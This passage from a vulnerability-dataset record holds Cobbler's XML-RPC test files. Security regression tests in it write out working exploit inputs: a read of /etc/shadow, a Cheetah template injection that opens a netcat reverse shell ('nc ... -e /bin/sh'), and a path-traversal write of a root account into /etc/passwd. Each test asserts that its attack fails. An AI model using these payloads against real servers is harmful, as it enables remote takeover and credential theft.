try_connect(url) -> xmlrpc.client.ServerProxy:\n+        xmlrpc_server = xmlrpc.client.ServerProxy(url)\n+        return xmlrpc_server\n+    return try_connect\n+\n+\n+@pytest.fixture(autouse=True)\n+def setup_profile(try_connect, create_kernel_initrd, fk_kernel, fk_initrd):\n+    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n+    shared_secret = get_shared_secret()\n+    token = cobbler_api.login(\"\", shared_secret)\n+    folder = create_kernel_initrd(fk_kernel, fk_initrd)\n+    kernel_path = os.path.join(folder, fk_kernel)\n+    initrd_path = os.path.join(folder, fk_kernel)\n+    # Create a test Distro\n+    distro = cobbler_api.new_distro(token)\n+    cobbler_api.modify_distro(distro, \"name\", \"security_test_distro\", token)\n+    cobbler_api.modify_distro(distro, \"arch\", \"x86_64\", token)\n+    cobbler_api.modify_distro(distro, \"kernel\", str(kernel_path), token)\n+    cobbler_api.modify_distro(distro, \"initrd\", str(initrd_path), token)\n+    cobbler_api.save_distro(distro, token)\n+    # Create a test Profile\n+    profile = cobbler_api.new_profile(token)\n+    cobbler_api.modify_profile(profile, \"name\", \"security_test_profile\", token)\n+    cobbler_api.modify_profile(profile, \"distro\", \"security_test_distro\", token)\n+    cobbler_api.save_profile(profile, token)\n+\n+    yield\n+\n+    cobbler_api.remove_profile(\"security_test_profile\", token)\n+    cobbler_api.remove_distro(\"security_test_distro\", token)\n+\n+\n+def test_arbitrary_file_disclosure_1(setup_profile, try_connect):\n+    # Arrange\n+    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n+\n+    # Act\n+    profiles = cobbler_api.get_profiles()\n+    target = profiles[0][\"name\"]\n+    try:\n+        result = cobbler_api.generate_script(target, \"\", \"/etc/shadow\")\n+\n+        # Assert this NOT succeeds\n+        assert not result.startswith(\"root\")\n+    except xmlrpc.client.Fault as e:\n+        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n+        # before something happened.\n+        assert \"ValueError\" in e.faultString\n+\n+\n+def test_template_injection_1(setup_profile, try_connect):\n+    # Arrange\n+    exploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'\n+    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n+\n+    # Act\n+    profiles = cobbler_api.get_profiles()\n+    target = profiles[0][\"name\"]\n+    try:\n+        print(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")\n+        result_stage_1 = cobbler_api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}')\n+        print(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")\n+        result_stage_2 = cobbler_api.generate_script(target, \"\", \"/var/log/cobbler/cobbler.log\")\n+\n+        # Assert this NOT succeeds\n+        assert not result_stage_1.startswith(\"__import__\")\n+        # We should never get to stage two\n+    except xmlrpc.client.Fault as e:\n+        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n+        # before something happened.\n+        assert \"ValueError\" in e.faultString\n+\n+\n+def test_arbitrary_file_write_1(setup_profile, try_connect):\n+    # Arrange\n+    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n+    exploit = b\"cha:!:0:0:cha:/:/bin/bash\\n\"\n+\n+    # Act\n+    result = cobbler_api.upload_log_data(\n+        \"../../../../../../etc\",\n+        \"passwd\",\n+        len(exploit),\n+        100000,\n+        base64.b64encode(exploit)\n+    )\n+\n+    # Assert this NOT succeeds\n+    assert result is False\n+\n+# ==================== END tnpconsultants ====================", "file_path": "files/2021_10/1112", "file_language": "py", "file_name": "tests/special_cases/security_test.py", "outdated_file_modify": 1, "outdated_file_before": 0, "outdated_file_after": 0, "llm_check": 0, "static_check": 0, "static": {"rats": [false, []], "semgrep": [false, []]}, "target": 0, "function_before": [{"function": "def test_arbitrary_file_disclosure_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        result = cobbler_api.generate_script(target, \"\", \"/etc/shadow\")\n\n        # Assert this NOT succeeds\n        assert not result.startswith(\"root\")\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString", "target": 0}, {"function": "def test_template_injection_1(setup_profile, try_connect):\n    # Arrange\n    exploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        print(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")\n        result_stage_1 = cobbler_api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}')\n        print(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")\n        result_stage_2 = cobbler_api.generate_script(target, \"\", \"/var/log/cobbler/cobbler.log\")\n\n        # Assert this NOT succeeds\n        assert not result_stage_1.startswith(\"__import__\")\n        # We should never get to stage two\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString", "target": 0}, {"function": "def test_arbitrary_file_write_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n    exploit = b\"cha:!:0:0:cha:/:/bin/bash\\n\"\n\n    # Act\n    result = cobbler_api.upload_log_data(\n        \"../../../../../../etc\",\n        \"passwd\",\n        len(exploit),\n        100000,\n        base64.b64encode(exploit)\n    )\n\n    # Assert this NOT succeeds\n    assert result is False", "target": 0}], "function_after": [{"function": "def test_arbitrary_file_disclosure_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        result = cobbler_api.generate_script(target, \"\", \"/etc/shadow\")\n\n        # Assert this NOT succeeds\n        assert not result.startswith(\"root\")\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString", "target": 0}, {"function": "def test_template_injection_1(setup_profile, try_connect):\n    # Arrange\n    exploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        print(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")\n        result_stage_1 = cobbler_api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}')\n        print(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")\n        result_stage_2 = cobbler_api.generate_script(target, \"\", \"/var/log/cobbler/cobbler.log\")\n\n        # Assert this NOT succeeds\n        assert not result_stage_1.startswith(\"__import__\")\n        # We should never get to stage two\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString", "target": 0}, {"function": "def test_arbitrary_file_write_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n    exploit = b\"cha:!:0:0:cha:/:/bin/bash\\n\"\n\n    # Act\n    result = cobbler_api.upload_log_data(\n        \"../../../../../../etc\",\n        \"passwd\",\n        len(exploit),\n        100000,\n        base64.b64encode(exploit)\n    )\n\n    # Assert this NOT succeeds\n    assert result is False", "target": 0}]}, {"raw_url": "https://github.com/cobbler/cobbler/raw/d8f60bbf14a838c8c8a1dba98086b223e35fe70a/tests%2Fxmlrpcapi%2Fmiscellaneous_test.py", "code": "import json\nimport os\nimport time\n\nimport pytest\n\nfrom cobbler.utils import get_shared_secret\n\n\n@pytest.mark.usefixtures(\"cobbler_xmlrpc_base\")\nclass TestMiscellaneous:\n    \"\"\"\n    Class to test remote calls to cobbler which do not belong into a specific category.\n    \"\"\"\n\n    def test_clear_system_logs(self, remote, token, create_kernel_initrd, create_distro, create_profile, create_system,\n                               remove_distro, remove_profile, remove_system):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        name_distro = \"testdistro_clearsystemlog\"\n        name_profile = \"testprofile_clearsystemlog\"\n        name_system = \"testsystem_clearsystemlog\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n\n        distro = create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        profile = create_profile(name_profile, name_distro, \"a=1 b=2 c=3 c=4 c=5 d e\")\n        system = create_system(name_system, name_profile)\n\n        # Act\n        result = remote.clear_system_logs(system, token)\n\n        # Cleanup\n        remove_distro(name_distro)\n        remove_profile(name_profile)\n        remove_system(name_system)\n\n        # Assert\n        assert result\n\n    def test_disable_netboot(self, remote, token, create_distro, remove_distro, create_profile, remove_profile,\n                             create_system, remove_system, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        name_distro = \"test_distro_template_for_system\"\n        name_profile = \"test_profile_template_for_system\"\n        name_system = \"test_system_template_for_system\"\n        folder = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(folder, fk_kernel)\n        path_initrd = os.path.join(folder, fk_initrd)\n\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        create_system(name_system, name_profile)\n\n        # Act\n        result = remote.disable_netboot(name_system, token)\n\n        # Cleanup\n        remove_system(name_system)\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert result\n\n    def test_extended_version(self, remote):\n        # Arrange\n\n        # Act\n        result = remote.extended_version()\n\n        # Assert Example Dict: {'builddate': 'Mon Feb 10 15:38:48 2020', 'gitdate': '?', 'gitstamp': '?', 'version':\n        #                       '3.1.2', 'version_tuple': [3, 1, 2]}\n        assert type(result) == dict\n        assert type(result.get(\"version_tuple\")) == list\n        assert [3, 3, 0] == result.get(\"version_tuple\")\n\n    def test_find_items_paged(self, remote, token, create_distro, remove_distro, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        folder = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(folder, fk_kernel)\n        path_initrd = os.path.join(folder, fk_initrd)\n        name_distro_1 = \"distro_items_paged_1\"\n        name_distro_2 = \"distro_items_paged_2\"\n        create_distro(name_distro_1, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_distro(name_distro_2, \"x86_64\", \"suse\", path_kernel, path_initrd)\n\n        # Act\n        result = remote.find_items_paged(\"distro\", None, \"name\", 1, 1)\n\n        # Cleanup\n        remove_distro(name_distro_1)\n        remove_distro(name_distro_2)\n\n        # Assert\n        # Example output\n        # {'items': [{'ctime': 1589386486.9040322, 'depth': 0, 'mtime': 1589386486.9040322, 'source_repos': [],\n        # 'tree_build_time': 0, 'uid': 'cbf288465c724c439cf2ede6c94de4e8', 'arch': 'x86_64', 'autoinstall_meta': {},\n        # 'boot_files': {}, 'boot_loaders': '<<inherit>>', 'breed': 'suse', 'comment': '', 'fetchable_files': {},\n        # 'initrd': '/var/log/cobbler/cobbler.log', 'kernel': '/var/log/cobbler/cobbler.log', 'remote_boot_initrd': '~',\n        # 'remote_boot_kernel': '~', 'kernel_options': {}, 'kernel_options_post': {}, 'mgmt_classes': [],\n        # 'name': 'distro_items_paged_1', 'os_version': 'virtio26', 'owners': ['admin'], 'redhat_management_key': '',\n        # 'template_files': {}}], 'pageinfo': {'page': 1, 'prev_page': '~', 'next_page': 2, 'pages': [1, 2],\n        # 'num_pages': 2, 'num_items': 2, 'start_item': 0, 'end_item': 1, 'items_per_page': 1,\n        # 'items_per_page_list': [10, 20, 50, 100, 200, 500]}}\n        assert type(result) == dict\n        assert type(result.get(\"items\")) == list\n        assert \"pageinfo\" in result\n        assert \"pages\" in result[\"pageinfo\"]\n        assert result[\"pageinfo\"][\"pages\"] == [1, 2]\n\n    @pytest.mark.skip(\"This functionality was implemented very quickly. The test for this needs to be fixed at a \"\n                      \"later point!\")\n    def test_find_system_by_dns_name(self, remote, token, create_distro, remove_distro, create_profile, remove_profile,\n                                     create_system, remove_system, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_template_for_system\"\n        name_profile = \"test_profile_template_for_system\"\n        name_system = \"test_system_template_for_system\"\n        dns_name = \"test.cobbler-test.local\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        system = create_system(name_system, name_profile)\n        remote.modify_system(system, \"dns_name\", dns_name, token)\n        remote.save_system(system, token)\n\n        # Act\n        result = remote.find_system_by_dns_name(dns_name)\n\n        # Cleanup\n        remove_system(name_system)\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert result\n\n    def test_generate_script(self, remote, create_distro, remove_distro, create_profile, remove_profile,\n                             create_system, remove_system, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_template_for_system\"\n        name_profile = \"test_profile_template_for_system\"\n        name_autoinstall_script = \"test_generate_script\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        # TODO: Create Autoinstall Script\n\n        # Act\n        result = remote.generate_script(name_profile, None, name_autoinstall_script)\n\n        # Cleanup\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert result\n\n    def test_get_item_as_rendered(self, remote, token, create_distro, remove_distro, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name = \"test_item_as_rendered\"\n        create_distro(name, \"x86_64\", \"suse\", path_kernel, path_initrd)\n\n        # Act\n        result = remote.get_distro_as_rendered(name, token)\n\n        # Cleanup\n        remove_distro(name)\n\n        # Assert\n        assert result\n\n    def test_get_s_since(self, remote, create_distro, remove_distro, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro_before = \"test_distro_since_before\"\n        name_distro_after = \"test_distro_since_after\"\n        create_distro(name_distro_before, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        mtime = float(time.time())\n        create_distro(name_distro_after, \"x86_64\", \"suse\", path_kernel, path_initrd)\n\n        # Act\n        result = remote.get_distros_since(mtime)\n\n        # Cleanup\n        remove_distro(name_distro_before)\n        remove_distro(name_distro_after)\n\n        # Assert\n        assert isinstance(result, list)\n        assert len(result) == 1\n\n    def test_get_authn_module_name(self, remote, token):\n        # Arrange\n\n        # Act\n        result = remote.get_authn_module_name(token)\n\n        # Assert\n        assert result\n\n    def test_get_blended_data(self, remote, create_distro, remove_distro, create_profile, remove_profile,\n                              create_system, remove_system, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_blended\"\n        name_profile = \"test_profile_blended\"\n        name_system = \"test_system_blended\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        create_system(name_system, name_profile)\n\n        # Act\n        result = remote.get_blended_data(name_profile, name_system)\n\n        # Cleanup\n        remove_system(name_system)\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert result\n\n    def test_get_config_data(self, remote, token, create_distro, remove_distro, create_profile, remove_profile,\n                             create_system, remove_system, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_template_for_system\"\n        name_profile = \"test_profile_template_for_system\"\n        name_system = \"test_system_template_for_system\"\n        system_hostname = \"testhostname\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        system = create_system(name_system, name_profile)\n        remote.modify_system(system, \"hostname\", system_hostname, token)\n        remote.save_system(system, token)\n\n        # Act\n        result = remote.get_config_data(system_hostname)\n\n        # Cleanup\n        remove_system(name_system)\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert json.loads(result)\n\n    def test_get_repos_compatible_with_profile(self, remote, token, create_distro, remove_distro, create_profile,\n                                               remove_profile, create_repo, remove_repo, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_get_repo_for_profile\"\n        name_profile = \"test_profile_get_repo_for_profile\"\n        name_repo_compatible = \"test_repo_compatible_profile_1\"\n        name_repo_incompatible = \"test_repo_compatible_profile_2\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        repo_compatible = create_repo(name_repo_compatible, \"http://localhost\", False)\n        repo_incompatible = create_repo(name_repo_incompatible, \"http://localhost\", False)\n        remote.modify_repo(repo_compatible, \"arch\", \"x86_64\", token)\n        remote.save_repo(repo_compatible, token)\n        remote.modify_repo(repo_incompatible, \"arch\", \"ppc64le\", token)\n        remote.save_repo(repo_incompatible, token)\n\n        # Act\n        result = remote.get_repos_compatible_with_profile(name_profile, token)\n\n        # Cleanup\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n        remove_repo(name_repo_compatible)\n        remove_repo(name_repo_incompatible)\n\n        # Assert\n        assert result != []\n\n    def test_get_status(self, remote, token):\n        # Arrange\n\n        # Act\n        result = remote.get_status(\"normal\", token)\n\n        # Assert\n        assert result == {}\n\n    @pytest.mark.skip(\"The function under test appears to have a bug. For now we skip the test.\")\n    def test_get_template_file_for_profile(self, remote, create_distro, remove_distro, create_profile, remove_profile,\n                                           create_autoinstall_template, remove_autoinstall_template,\n                                           create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_template_for_profile\"\n        name_profile = \"test_profile_template_for_profile\"\n        name_template = \"test_template_for_profile\"\n        content_template = \"# Testtemplate\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        create_autoinstall_template(name_template, content_template)\n\n        # Act\n        # TODO: Fix test & functionality!\n        result = remote.get_template_file_for_profile(name_profile, name_template)\n\n        # Cleanup\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n        remove_autoinstall_template(name_template)\n\n        # Assert\n        assert result == content_template\n\n    def test_get_template_file_for_system(self, remote, create_distro, remove_distro, create_profile, remove_profile,\n                                          create_system, remove_system, create_autoinstall_template,\n                                          remove_autoinstall_template, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_template_for_system\"\n        name_profile = \"test_profile_template_for_system\"\n        name_system = \"test_system_template_for_system\"\n        name_template = \"test_template_for_system\"\n        content_template = \"# Testtemplate\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        create_system(name_system, name_profile)\n        create_autoinstall_template(name_template, content_template)\n\n        # Act\n        result = remote.get_template_file_for_system(name_system, name_template)\n\n        # Cleanup\n        remove_system(name_system)\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n        remove_autoinstall_template(name_template)\n\n        # Assert\n        assert result\n\n    def test_is_autoinstall_in_use(self, remote, token, create_distro, remove_distro, create_profile, remove_profile,\n                                   create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name_distro = \"test_distro_is_autoinstall_in_use\"\n        name_profile = \"test_profile_is_autoinstall_in_use\"\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n\n        # Act\n        result = remote.is_autoinstall_in_use(name_profile, token)\n\n        # Cleanup\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert not result\n\n    def test_logout(self, remote):\n        # Arrange\n        shared_secret = get_shared_secret()\n        newtoken = remote.login(\"\", shared_secret)\n\n        # Act\n        resultlogout = remote.logout(newtoken)\n        resulttokencheck = remote.token_check(newtoken)\n\n        # Assert\n        assert resultlogout\n        assert not resulttokencheck\n\n    def test_modify_setting(self, remote, token):\n        # Arrange\n\n        # Act\n        result = remote.modify_setting(\"auth_token_expiration\", 7200, token)\n\n        # Assert\n        assert result == 1\n\n    def test_read_autoinstall_template(self, remote, token, create_autoinstall_template, remove_autoinstall_template):\n        # Arrange\n        name = \"test_template_name\"\n        create_autoinstall_template(name, \"# Testtemplate\")\n\n        # Act\n        result = remote.read_autoinstall_template(name, token)\n\n        # Cleanup\n        remove_autoinstall_template(name)\n\n        # Assert\n        assert result\n\n    def test_write_autoinstall_template(self, remote, token, remove_autoinstall_template):\n        # Arrange\n        name = \"testtemplate\"\n\n        # Act\n        result = remote.write_autoinstall_template(name, \"# Testtemplate\", token)\n\n        # Cleanup\n        remove_autoinstall_template(name)\n\n        # Assert\n        assert result\n\n    def test_remove_autoinstall_template(self, remote, token, create_autoinstall_template):\n        # Arrange\n        name = \"test_template_remove\"\n        create_autoinstall_template(name, \"# Testtemplate\")\n\n        # Act\n        result = remote.remove_autoinstall_template(name, token)\n\n        # Assert\n        assert result\n\n    def test_read_autoinstall_snippet(self, remote, token, testsnippet, snippet_add, snippet_remove):\n        # Arrange\n        snippet_name = \"testsnippet_read\"\n        snippet_add(snippet_name, testsnippet)\n\n        # Act\n        result = remote.read_autoinstall_snippet(snippet_name, token)\n\n        # Assert\n        assert result == testsnippet\n\n        # Cleanup\n        snippet_remove(snippet_name)\n\n    def test_write_autoinstall_snippet(self, remote, token, testsnippet, snippet_remove):\n        # Arrange\n        # See fixture: testsnippet\n        name = \"testsnippet_write\"\n\n        # Act\n        result = remote.write_autoinstall_snippet(name, testsnippet, token)\n\n        # Assert\n        assert result\n\n        # Cleanup\n        snippet_remove(name)\n\n    def test_remove_autoinstall_snippet(self, remote, token, snippet_add, testsnippet):\n        # Arrange\n        name = \"testsnippet_remove\"\n        snippet_add(name, testsnippet)\n\n        # Act\n        result = remote.remove_autoinstall_snippet(name, token)\n\n        # Assert\n        assert result\n\n    def test_run_install_triggers(self, remote, token):\n        # Arrange\n        # TODO: Needs a system as a target\n\n        # Act\n        result_pre = remote.run_install_triggers(\"pre\", \"system\", \"systemname\", \"10.0.0.2\", token)\n        result_post = remote.run_install_triggers(\"post\", \"system\", \"systemname\", \"10.0.0.2\", token)\n\n        # Assert\n        assert result_pre\n        assert result_post\n\n    def test_version(self, remote):\n        # Arrange\n\n        # Act\n        result = remote.version()\n\n        # Assert\n        # Will fail if the version is adjusted in the setup.py\n        assert result == 3.3\n\n    def test_xapi_object_edit(self, remote, token, remove_distro, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n        name = \"testdistro_xapi_edit\"\n\n        # Act\n        result = remote.xapi_object_edit(\"distro\", name, \"add\",\n                                         {\"name\": name, \"arch\": \"x86_64\", \"breed\": \"suse\", \"kernel\": path_kernel,\n                                          \"initrd\": path_initrd}, token)\n\n        # Cleanup\n        remove_distro(name)\n\n        # Assert\n        assert result\n\n    @pytest.mark.usefixtures(\"create_testdistro\", \"create_testmenu\", \"create_profile\", \"remove_testdistro\",\n                             \"remove_testmenu\", \"remove_testprofile\")\n    def test_render_vars(self, remote, token):\n        \"\"\"\n        Test: string replacements for @@xyz@@\n        \"\"\"\n\n        # Arrange --> There is nothing to be arranged\n        kernel_options = \"tree=http://@@http_server@@/cblr/links/@@distro_name@@\"\n\n        # Act\n        distro = remote.get_item_handle(\"distro\", \"testdistro0\", token)\n        remote.modify_distro(distro, \"kernel_options\", kernel_options, token)\n        remote.save_distro(distro, token)\n\n        # Assert --> Let the test pass if the call is okay.\n        assert True\n\n    @pytest.mark.skip(\"Functionality is broken!\")\n    @pytest.mark.usefixtures(\"create_testdistro\", \"create_testmenu\", \"create_testprofile\", \"create_testsystem\",\n                             \"remove_testdistro\", \"remove_testmenu\", \"remove_testprofile\", \"remove_testsystem\")\n    def test_upload_log_data(self, remote):\n        # Arrange\n\n        # Act\n        result = remote.upload_log_data(\"testsystem0\", \"testinstall.log\", 0, 0, b\"asdas\")\n\n        # Assert\n        assert isinstance(result, bool)\n        assert result\n", "code_before": "import json\nimport os\nimport time\n\nimport pytest\n\nfrom cobbler.utils import get_shared_secret\n\n\n@pytest.mark.usefixtures(\"cobbler_xmlrpc_base\")\nclass TestMiscellaneous:\n    \"\"\"\n    Class to test remote calls to cobbler which do not belong into a specific category.\n    \"\"\"\n\n    def test_clear_system_logs(self, remote, token, create_kernel_initrd, create_distro, create_profile, create_system,\n                               remove_distro, remove_profile, remove_system):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        name_distro = \"testdistro_clearsystemlog\"\n        name_profile = \"testprofile_clearsystemlog\"\n        name_system = \"testsystem_clearsystemlog\"\n        basepath = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(basepath, fk_kernel)\n        path_initrd = os.path.join(basepath, fk_initrd)\n\n        distro = create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        profile = create_profile(name_profile, name_distro, \"a=1 b=2 c=3 c=4 c=5 d e\")\n        system = create_system(name_system, name_profile)\n\n        # Act\n        result = remote.clear_system_logs(system, token)\n\n        # Cleanup\n        remove_distro(name_distro)\n        remove_profile(name_profile)\n        remove_system(name_system)\n\n        # Assert\n        assert result\n\n    def test_disable_netboot(self, remote, token, create_distro, remove_distro, create_profile, remove_profile,\n                             create_system, remove_system, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        name_distro = \"test_distro_template_for_system\"\n        name_profile = \"test_profile_template_for_system\"\n        name_system = \"test_system_template_for_system\"\n        folder = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(folder, fk_kernel)\n        path_initrd = os.path.join(folder, fk_initrd)\n\n        create_distro(name_distro, \"x86_64\", \"suse\", path_kernel, path_initrd)\n        create_profile(name_profile, name_distro, \"text\")\n        create_system(name_system, name_profile)\n\n        # Act\n        result = remote.disable_netboot(name_system, token)\n\n        # Cleanup\n        remove_system(name_system)\n        remove_profile(name_profile)\n        remove_distro(name_distro)\n\n        # Assert\n        assert result\n\n    def test_extended_version(self, remote):\n        # Arrange\n\n        # Act\n        result = remote.extended_version()\n\n        # Assert Example Dict: {'builddate': 'Mon Feb 10 15:38:48 2020', 'gitdate': '?', 'gitstamp': '?', 'version':\n        #                       '3.1.2', 'version_tuple': [3, 1, 2]}\n        assert type(result) == dict\n        assert type(result.get(\"version_tuple\")) == list\n        assert [3, 3, 0] == result.get(\"version_tuple\")\n\n    def test_find_items_paged(self, remote, token, create_distro, remove_distro, create_kernel_initrd):\n        # Arrange\n        fk_kernel = \"vmlinuz1\"\n        fk_initrd = \"initrd1.img\"\n        folder = create_kernel_initrd(fk_kernel, fk_initrd)\n        path_kernel = os.path.join(folder, fk_kernel)\n        path_initrd = os.path.join(folder, fk_initrd)\n        name_distro_1 = \"distro_items_paged_1\"\n        name_distro_2 = 